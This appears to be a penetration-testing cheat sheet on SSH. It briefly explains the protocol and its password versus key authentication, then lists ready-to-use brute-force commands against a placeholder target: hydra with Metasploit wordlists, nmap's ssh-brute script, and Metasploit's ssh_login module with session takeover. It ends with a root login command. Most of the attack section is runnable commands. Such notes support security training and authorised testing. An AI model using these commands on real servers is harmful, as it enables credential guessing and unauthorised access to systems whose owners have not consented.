# SSH

# Explanation

- SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.

- It is typically used for remote access to servers and systems.

- SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.

- SSH authentication can be configured in two ways :
    - Username & password authentication
    - Key based authentication

- In the case of username and password authentication, we can perform a brute-force attack on the SSH server in order to identify legitimate credentials and consequently gain access to the target system.

# SSH brute force attack

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> -t 4 ssh
```

```
nmap --script ssh-brute --script-args userdb=/root/users.txt -p 22 <target>
```

```
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set RHOSTS <target>
msf6 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 > set VERBOSE true
msf6 > sessions
msf6 > sessions -i 1

# SSH commands

```
ssh root@<target>
```
